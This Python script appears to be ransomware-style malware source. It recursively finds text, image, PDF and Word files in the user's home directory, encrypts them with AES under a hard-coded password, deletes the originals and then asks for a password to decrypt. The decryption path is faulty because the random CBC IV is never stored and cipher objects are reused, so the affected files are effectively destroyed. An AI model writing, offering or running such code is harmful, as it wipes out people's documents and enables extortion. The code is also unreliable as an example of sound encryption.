import os
import tkinter as tk
from tkinter import simpledialog
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode, b64decode

TARGET_EXTENSIONS = (".txt", ".jpeg", ".pdf", ".docx", ".doc")
ENCRYPTED_EXTENSION = ".enc"

def process_file(filepath, cipher, decrypt=False):
    with open(filepath, 'rb') as f:
        content = f.read()
    
    if not decrypt:
        encrypted_content = b64encode(cipher.encrypt(pad(content, AES.block_size)))
    else:
        encrypted_content = unpad(cipher.decrypt(b64decode(content)), AES.block_size)
    
    if not decrypt:
        new_filepath = filepath + ENCRYPTED_EXTENSION
    else:
        new_filepath = filepath.replace(ENCRYPTED_EXTENSION, "")
    
    with open(new_filepath, 'wb') as f:
        f.write(encrypted_content)

    if new_filepath != filepath:
        os.remove(filepath)

    return new_filepath

def process_files(filepaths, cipher, decrypt=False):
    new_filepaths = []
    for filepath in filepaths:
        if decrypt or not filepath.endswith(ENCRYPTED_EXTENSION):
            new_filepath = process_file(filepath, cipher, decrypt)
            new_filepaths.append(new_filepath)
            print(f"Processed file {filepath}")
    return new_filepaths

def find_files(start_path, extensions=None):
    if extensions is None:
        extensions = []

    found_files = []
    for root, _, files in os.walk(start_path):
        for file in files:
            if file.endswith(extensions):
                found_files.append(os.path.join(root, file))
    return found_files

def get_password(prompt):
    root = tk.Tk()
    root.withdraw()
    return simpledialog.askstring("Password", prompt, show="*")

def main():
    password = "swordf!sh"
    encoded_password = password.encode()

    while len(encoded_password) < 16:
        encoded_password += b'\x00'

    cipher_encrypt = AES.new(encoded_password, AES.MODE_CBC)
    cipher_decrypt = AES.new(encoded_password, AES.MODE_CBC)

    home_dir = os.path.expanduser("~")
    target_files = find_files(home_dir, extensions=TARGET_EXTENSIONS)

    encrypted_files = process_files(target_files, cipher_encrypt, decrypt=False)
    print("Files have been encrypted. To decrypt, enter the correct password.")

    input_password = get_password("Enter your password to decrypt files:")
    if input_password != password:
        print("Incorrect password. Files cannot be decrypted.")
        return

    encrypted_files_with_extension = [filepath for filepath in encrypted_files if filepath.endswith(ENCRYPTED_EXTENSION)]
    process_files(encrypted_files_with_extension, cipher_decrypt, decrypt=True)
    print("Files have been decrypted.")

if __name__ == "__main__":
    main()
